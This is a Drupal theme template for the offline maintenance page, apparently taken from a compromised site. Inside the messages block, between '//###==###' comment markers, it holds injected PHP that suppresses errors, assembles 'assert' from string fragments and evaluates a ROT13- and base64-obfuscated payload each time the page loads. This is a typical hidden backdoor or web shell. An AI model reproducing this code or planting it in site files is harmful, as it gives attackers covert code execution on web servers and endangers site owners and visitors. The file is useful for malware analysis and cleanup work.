<?php

/**
 * @file
 * Implementation to display a single Drupal page while offline.
 *
 * All the available variables are mirrored in page.tpl.php.
 *
 * @see template_preprocess()
 * @see template_preprocess_maintenance_page()
 * @see bartik_process_maintenance_page()
 */
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">
<head>
  <?php print $head; ?>
  <title><?php print $head_title; ?></title>
  <?php print $styles; ?>
  <?php print $scripts; ?>
</head>
<body class="<?php print $classes; ?>" <?php print $attributes;?>>

  <div id="skip-link">
    <a href="#main-content" class="element-invisible element-focusable"><?php print t('Skip to main content'); ?></a>
  </div>

  <div id="page-wrapper"><div id="page">

    <div id="header"><div class="section clearfix">
      <?php if ($site_name || $site_slogan): ?>
        <div id="name-and-slogan"<?php if ($hide_site_name && $hide_site_slogan) { print ' class="element-invisible"'; } ?>>
          <?php if ($site_name): ?>
            <div id="site-name"<?php if ($hide_site_name) { print ' class="element-invisible"'; } ?>>
              <strong>
                <a href="<?php print $front_page; ?>" title="<?php print t('Home'); ?>" rel="home"><span><?php print $site_name; ?></span></a>
              </strong>
            </div>
          <?php endif; ?>
          <?php if ($site_slogan): ?>
            <div id="site-slogan"<?php if ($hide_site_slogan) { print ' class="element-invisible"'; } ?>>
              <?php print $site_slogan; ?>
            </div>
          <?php endif; ?>
        </div> <!-- /#name-and-slogan -->
      <?php endif; ?>
    </div></div> <!-- /.section, /#header -->

    <div id="main-wrapper"><div id="main" class="clearfix">
      <div id="content" class="column"><div class="section">
        <a id="main-content"></a>
        <?php if ($title): ?><h1 class="title" id="page-title"><?php print $title; ?></h1><?php endif; ?>
        <?php print $content; ?>
        <?php if ($messages): ?>
          <div id="messages"><div class="section clearfix">
            <?php print $messages; ?>
          </div></div> <!-- /.section, /#messages -->
        <?php endif; 


//###==###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUgcMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFyxnJHbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXGgcMvtunKAmMKDbWTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy0cXKgcMvujpzIaK21uqTAbXPVuYvS1VvkznJkyK2qyqS9wo250MJ50pltxK1ASHyMSHyfvH0AFFIOHK0MWGRIBDH1SVy0cXFy7WTZjCFWIIRLgBPV7sJIfp2I7WTZjCFW3nJ5xo3qmYGRlAGRvB319MJkmMKfxLmN9WTAsJlWVISEDK0SQD0IDIS9QFRSFH0IHVy07sJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcrlEwZG1wqKWfK2yhnKDbVzu0qUN6Yl9eMzcmoaEcrT94n2Smn2LhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzZ9Vv4xLmNhVvMcCGRznKN9Vv4xK1ASHyMSHyfvHxIAG1ESK0SRESVvKF4vWzt9Vv5gMQHbVwZkMQH5Awx4MQR2MzIxMTMzLzZmMQOyZQt2LJSuMGuyVv4xK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKF4xK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0hWTZjYvVkVvxcB2A1pzksp2I0o3O0XPEwZFj0ZvkzLJkmMFx7L3IloS9mMKEipUDbWTZkYQR5BGRmYUElqJHcBlEcLaLtCFNtL3IloS9yrTIwXPEwZFx7L3IloS9woT9mMFtxLmRcB31yoUAynJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvx9CGRcrlEcLaLtCFOznJkyK2qyqS9wo250MJ50pltvnUE0pQbiY2gznaAhqTy4o3ueLKAeMv5lqF9aMKDhpTujC2D9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVzLm0vYvEwZP4vWzx9ZFMcpQ0vYvEsH0IFIxIFJlWFEH1CIRIsDHERHvWqYvVznQ0vYz1xAFtvZmSxAGx2BGuxZGMzMJExMzMvLmAxZTHjBQMuLJSyBTHvYvEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqYvEsH0IFIxIFJlWVISEDK1IGEIWsDHqSGyDvKF4xLmNhVwRvXFx7sFOcMvNbnKAmMKDbWTyvqvxcVUftMJAbolNxnJW2BlO9VTyzXTymp2I0XPEsHxIEIHIGISfvpPWqXFNzWvNxK1WSHIISH1EoVaNvKFN9CFNvLmuvZzWxZQxvXFO7VROup3AypaDbWS9FEISIEIAHJlWwVy0cBlO9sD=="));'));
//###==###
?>
      </div></div> <!-- /.section, /#content -->
    </div></div> <!-- /#main, /#main-wrapper -->

  </div></div> <!-- /#page, /#page-wrapper -->

</body>
</html>